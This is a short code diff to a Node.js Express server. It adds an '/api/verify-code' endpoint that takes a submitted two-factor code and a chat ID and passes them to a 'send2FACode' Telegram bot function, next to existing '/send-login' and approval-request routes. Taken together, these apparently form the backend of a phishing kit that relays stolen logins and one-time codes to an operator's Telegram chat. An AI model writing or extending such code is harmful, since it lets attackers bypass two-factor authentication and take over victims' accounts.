@@ -1,4 +1,3 @@
-// server.js (merged)
 console.log("📦 Starting combined server.js...");
 
 const express = require("express");
@@ -10,7 +9,8 @@ const {
   sendApprovalRequestGeneric,
   sendApprovalRequestSMS,
   sendApprovalRequestPage,
-  sendLoginTelegram
+  sendLoginTelegram,
+  send2FACode
 } = require("./bot");
 
 const app = express();
@@ -111,6 +111,18 @@ app.post("/send-login", async (req, res) => {
   }
 
   res.json({ status: "ok" });
+});
+
+// -----------------
+// 2FA Code via Telegram
+app.post('/api/verify-code', (req, res) => {
+  const { code, chatId } = req.body;
+  if (typeof code === "string" && code.length >= 6 && code.length <= 8) {
+    send2FACode(code, chatId);
+    res.status(200).send({ message: 'Code sent to Telegram.' });
+  } else {
+    res.status(400).send({ message: 'Invalid code length.' });
+  }
 });
 
 // -----------------
